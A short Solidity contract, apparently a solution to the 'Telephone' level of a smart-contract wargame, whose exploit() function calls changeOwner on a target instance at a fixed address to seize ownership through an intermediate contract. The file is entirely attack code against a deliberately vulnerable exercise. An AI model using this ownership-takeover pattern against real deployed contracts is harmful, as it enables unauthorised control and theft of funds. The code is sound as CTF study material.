// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel04.sol";

contract Tele {
    Telephone level4 = Telephone(0xf2585aB001D77CEF708d2E435D60F9Dbd4fC4aB4);

    function exploit() external {

        level4.changeOwner(0xEAce4b71CA1A128e8B562561f46896D55B9B0246);
        
    }
}